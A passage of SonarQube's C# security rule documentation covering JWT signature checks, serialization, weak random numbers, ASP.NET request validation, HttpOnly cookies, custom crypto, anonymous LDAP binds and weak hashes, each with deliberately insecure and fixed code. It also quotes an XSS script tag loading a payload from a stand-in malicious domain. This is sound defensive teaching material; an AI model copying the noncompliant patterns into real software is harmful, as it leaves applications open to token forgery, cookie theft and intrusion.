<pre data-diff-id="1" data-diff-type="noncompliant">
using JWT;

public static void decode(IJwtDecoder decoder)
{
    decoder.Decode(token, secret, verify: false); // Noncompliant
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
using JWT;

public static void decode()
{
    var jwt = new JwtBuilder()
        .WithSecret(secret)
        .Decode(token); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using JWT;

public static void decode(IJwtDecoder decoder)
{
    decoder.Decode(token, secret, verify: true);
}
</pre>
<p>When using <code>JwtBuilder</code>, make sure to call <code>MustVerifySignature()</code>.</p>
<pre data-diff-id="2" data-diff-type="compliant">
using JWT;

public static void decode()
{
    var jwt = new JwtBuilder()
        .WithSecret(secret)
        .MustVerifySignature()
        .Decode(token);
}
</pre>
<h3>How does this work?</h3>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue, follow these instructions:</p>
<ol>
  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>
  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for
  further investigation. </li>
  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>
</ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4212">
              csharpsquid:S4212
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>Because serialization constructors allocate and initialize objects, security checks that are present on regular constructors must also be present
on a serialization constructor. Failure to do so would allow callers that could not otherwise create an instance to use the serialization constructor
to do this.</p>
<p>This rule raises an issue when a type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or
interface, is declared in an assembly that allows partially trusted callers and has a constructor that takes a
<code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object which is
not secured by a security check, but one or more of the regular constructors in the type is secured.</p>
<h3>Noncompliant code example</h3>
<pre>
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;

[assembly: AllowPartiallyTrustedCallersAttribute()]
namespace MyLibrary
{
    [Serializable]
    public class Foo : ISerializable
    {
        private int n;

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]
        public Foo()
        {
           n = -1;
        }

        protected Foo(SerializationInfo info, StreamingContext context) // Noncompliant
        {
           n = (int)info.GetValue("n", typeof(int));
        }

        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
           info.AddValue("n", n);
        }
    }
}
</pre>
<h3>Compliant solution</h3>
<pre>
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security;
using System.Security.Permissions;

[assembly: AllowPartiallyTrustedCallersAttribute()]
namespace MyLibrary
{
    [Serializable]
    public class Foo : ISerializable
    {
        private int n;

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]
        public Foo()
        {
           n = -1;
        }

        [FileIOPermissionAttribute(SecurityAction.Demand, Unrestricted = true)]
        protected Foo(SerializationInfo info, StreamingContext context)
        {
           n = (int)info.GetValue("n", typeof(int));
        }

        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
           info.AddValue("n", n);
        }
    }
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization </a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2245">
              csharpsquid:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>System.Random</code> class relies on a pseudorandom number generator, it should not be used for security-critical applications or for
protecting sensitive data. In such context, the <code>System.Cryptography.RandomNumberGenerator</code> class which relies on a cryptographically
strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Only use random number generators which are <a
  href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation">recommended by
  OWASP</a> or any other trusted organization. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
var random = new Random(); // Sensitive use of Random
byte[] data = new byte[16];
random.NextBytes(data);
return BitConverter.ToString(data); // Check if this value is used for hashing or encryption
</pre>
<h2>Compliant Solution</h2>
<pre>
using System.Security.Cryptography;
...
var randomGenerator = RandomNumberGenerator.Create(); // Compliant for security-sensitive use cases
byte[] data = new byte[16];
randomGenerator.GetBytes(data);
return BitConverter.ToString(data);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5753">
              csharpsquid:S5753
            </a>
          </td>
          <td>
            <details>
              <p>ASP.NET 1.1+ comes with a feature called <em>Request Validation</em>, preventing the server to accept content containing un-encoded HTML. This
feature comes as a first protection layer against Cross-Site Scripting (XSS) attacks and act as a simple Web Application Firewall (WAF) rejecting
requests potentially containing malicious content.</p>
<p>While this feature is not a silver bullet to prevent all XSS attacks, it helps to catch basic ones. It will for example prevent <code>&lt;script
type="text/javascript" src="https://malicious.domain/payload.js"&gt;</code> to reach your Controller.</p>
<p>Note: <em>Request Validation</em> feature being only available for ASP.NET, no Security Hotspot is raised on ASP.NET Core applications.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the developer doesn’t know the impact to deactivate the Request Validation feature </li>
  <li> the web application accepts user-supplied data </li>
  <li> all user-supplied data are not validated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Activate the Request Validation feature for all HTTP requests </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>At Controller level:</p>
<pre>
[ValidateInput(false)]
public ActionResult Welcome(string name)
{
  ...
}
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest="false" /&gt;
      ...
      &lt;httpRuntime requestValidationMode="0.0" /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<p>At Controller level:</p>
<pre>
[ValidateInput(true)]
public ActionResult Welcome(string name)
{
  ...
}
</pre>
<p>or</p>
<pre>
public ActionResult Welcome(string name)
{
  ...
}
</pre>
<p>At application level, configured in the Web.config file:</p>
<pre>
&lt;configuration&gt;
   &lt;system.web&gt;
      &lt;pages validateRequest="true" /&gt;
      ...
      &lt;httpRuntime requestValidationMode="4.5" /&gt;
   &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpruntimesection.requestvalidationmode?view=netframework-4.8">HttpRuntimeSection.RequestValidationMode Property</a> </li>
  <li> <a href="https://owasp.org/www-community/ASP-NET_Request_Validation">OWASP ASP.NET Request Validation</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S3330">
              csharpsquid:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When the <code>HttpCookie.HttpOnly</code> property is set to <code>false</code> then the cookie can be accessed by client side code:</p>
<pre>
HttpCookie myCookie = new HttpCookie("Sensitive cookie");
myCookie.HttpOnly = false; // Sensitive: this cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcookie.httponly?view=netframework-4.8">default value</a> of
<code>HttpOnly</code> flag is <code>false</code>, unless overwritten by an application’s configuration file:</p>
<pre>
HttpCookie myCookie = new HttpCookie("Sensitive cookie");
// Sensitive: this cookie is created without the httponly flag  (by default set to false) and so it can be stolen easily in case of XSS vulnerability
</pre>
<h2>Compliant Solution</h2>
<p>Set the <code>HttpCookie.HttpOnly</code> property to <code>true</code>:</p>
<pre>
HttpCookie myCookie = new HttpCookie("Sensitive cookie");
myCookie.HttpOnly = true; // Compliant: the sensitive cookie is protected against theft thanks to the HttpOnly property set to true (HttpOnly = true)
</pre>
<p>Or change the default flag values for the whole application by editing the <a
href="https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms228262(v=vs.100)">Web.config configuration file</a>:</p>
<pre>
&lt;httpCookies httpOnlyCookies="true" requireSSL="true" /&gt;
</pre>
<ul>
  <li> the <code>requireSSL</code> attribute corresponds programmatically to the <code>Secure</code> field. </li>
  <li> the <code>httpOnlyCookies</code> attribute corresponds programmatically to the <code>httpOnly</code> field. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1004">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5766">
              csharpsquid:S5766
            </a>
          </td>
          <td>
            <details>
              <p>Deserialization process extracts data from the serialized representation of an object and reconstruct it directly, without calling constructors.
Thus, data validation implemented in constructors can be bypassed if serialized objects are controlled by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The data validation implemented in constructors enforces a relevant security check. </li>
  <li> Objects instantiated via deserialization don’t run the same security checks as the ones executed when objects are created through constructors.
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> At the end of the deserialization process it is recommended to perform the same validation checks as the ones performed in constructors,
  especially when the serialized object can be controlled by an attacker. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When a <code>serializable</code> class doesn’t inherit from <a
href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=netframework-4.8">ISerializable</a> or <a
href="https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view=netframework-4.8">IDeserializationCallback</a>
types and has a constructor using its parameters in conditions:</p>
<pre>
[Serializable]
public class InternalUrl
{
    private string url;

    public InternalUrl(string tmpUrl) // Sensitive
    {
       if(!tmpUrl.StartsWith("http://localhost/")) // there is some input validation
       {
          url= "http://localhost/default";
       }
       else
       {
          url= tmpUrl;
       }
    }
}
</pre>
<p>When a class inherit from <a
href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=netframework-4.8">ISerializable</a> type, has a
regular constructor using its parameters in conditions, but doesn’t perform the same validation after deserialization:</p>
<pre>
[Serializable]
public class InternalUrl : ISerializable
{
    private string url;

    public InternalUrl(string tmpUrl) // Sensitive
    {
        if(!tmpUrl.StartsWith("http://localhost/")) // there is some input validation
        {
            url= "http://localhost/default";
        }
        else
        {
            url= tmpUrl;
        }
    }

    // special constructor used during deserialization
    protected InternalUrl(SerializationInfo info, StreamingContext context) // Sensitive
    {
       url= (string) info.GetValue("url", typeof(string));
       // the same validation as seen in the regular constructor is not performed
     }

    void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.AddValue("url", url);
    }
}
</pre>
<p>When a class inherit from <a
href="https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view=netframework-4.8">IDeserializationCallback</a>
type, has a constructor using its parameters in conditions but the <code>IDeserializationCallback.OnDeserialization</code> method doesn’t perform any
conditional checks:</p>
<pre>
[Serializable]
public class InternalUrl : IDeserializationCallback
{
    private string url;

    public InternalUrl(string tmpUrl) // Sensitive
    {
        if(!tmpUrl.StartsWith("http://localhost/")) // there is some input validation
        {
            url= "http://localhost/default";
        }
        else
        {
            url= tmpUrl;
        }
    }

    void IDeserializationCallback.OnDeserialization(object sender) // Sensitive
    {
       // the same validation as seen in the constructor is not performed
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>When using <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.iserializable?view=netframework-4.8">ISerializable</a>
type to control deserialization, perform the same checks inside regular constructors than in the special constructor <code>SerializationInfo info,
StreamingContext context</code> used during deserialization:</p>
<pre>
[Serializable]
public class InternalUrl : ISerializable
{
    private string url;

    public InternalUrl(string tmpUrl)
    {
        if(!tmpUrl.StartsWith("http://localhost/")) // there is some input validation
        {
            url= "http://localhost/default";
        }
        else
        {
            url= tmpUrl;
        }
    }

    // special constructor used during deserialization
    protected InternalUrl(SerializationInfo info, StreamingContext context)
    {
       string tmpUrl= (string) info.GetValue("url", typeof(string));

       if(!tmpUrl.StartsWith("http://localhost/") { // Compliant
          url= "http://localhost/default";
       }
       else {
          url= tmpUrl;
       }
     }

    void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.AddValue("url", url);
    }
}
</pre>
<p>When using <a
href="https://docs.microsoft.com/fr-fr/dotnet/api/system.runtime.serialization.ideserializationcallback?view=netframework-4.8">IDeserializationCallback</a>
type to control deserialization, perform the same checks inside regular constructors than after deserialization with
<code>IDeserializationCallback.OnDeserialization</code> method:</p>
<pre>
[Serializable]
public class InternalUrl : IDeserializationCallback
{
    private string url;

    public InternalUrl(string tmpUrl)
    {
       if(!tmpUrl.StartsWith("http://localhost/")) // there is some input validation
       {
          url= "http://localhost/default";
       }
       else
       {
          url= tmpUrl;
       }
    }

    void IDeserializationCallback.OnDeserialization(object sender) // Compliant
    {
        if(!url.StartsWith("http://localhost/"))
        {
            url= "http://localhost/default";
        }
        else
        {
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/framework/misc/security-and-serialization">docs.microsoft.com</a> - security-and-serialization
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2257">
              csharpsquid:S2257
            </a>
          </td>
          <td>
            <details>
              <p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>AES</code>, <code>RSA</code>, <code>SHA</code>, …​ should be used instead.</p>
<p>This rule tracks custom implementation of these types from <code>System.Security.Cryptography</code> namespace:</p>
<ul>
  <li> <code>AsymmetricAlgorithm</code> </li>
  <li> <code>AsymmetricKeyExchangeDeformatter</code> </li>
  <li> <code>AsymmetricKeyExchangeFormatter</code> </li>
  <li> <code>AsymmetricSignatureDeformatter</code> </li>
  <li> <code>AsymmetricSignatureFormatter</code> </li>
  <li> <code>DeriveBytes</code> </li>
  <li> <code>HashAlgorithm</code> </li>
  <li> <code>ICryptoTransform</code> </li>
  <li> <code>SymmetricAlgorithm</code> </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a standard algorithm instead of creating a custom one. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public class CustomHash : HashAlgorithm // Noncompliant
{
    private byte[] result;

    public override void Initialize() =&gt; result = null;
    protected override byte[] HashFinal() =&gt; result;

    protected override void HashCore(byte[] array, int ibStart, int cbSize) =&gt;
        result ??= array.Take(8).ToArray();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
SHA256 mySHA256 = SHA256.Create()
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST">MessageDigest is Custom</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4433">
              csharpsquid:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul>
  <li> <em>Anonymous</em> Authentication </li>
  <li> <em>Unauthenticated</em> Authentication </li>
  <li> <em>Name/Password</em> Authentication </li>
</ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
DirectoryEntry myDirectoryEntry = new DirectoryEntry(adPath);
myDirectoryEntry.AuthenticationType = AuthenticationTypes.None; // Noncompliant

DirectoryEntry myDirectoryEntry = new DirectoryEntry(adPath, "u", "p", AuthenticationTypes.None); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
DirectoryEntry myDirectoryEntry = new DirectoryEntry(myADSPath); // Compliant; default DirectoryEntry.AuthenticationType property value is "Secure" since .NET Framework 2.0

DirectoryEntry myDirectoryEntry = new DirectoryEntry(myADSPath, "u", "p", AuthenticationTypes.Secure);
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4790">
              csharpsquid:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
var hashProvider1 = new MD5CryptoServiceProvider(); // Sensitive
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("MD5"); // Sensitive
var hashProvider3 = new SHA1Managed(); // Sensitive
var hashProvider4 = HashAlgorithm.Create("SHA1"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
var hashProvider1 = new SHA512Managed(); // Compliant
var hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("SHA512Managed"); // Compliant
var hashProvider3 = HashAlgorithm.Create("SHA512Managed"); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S4792">
              csharpsquid:S4792
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
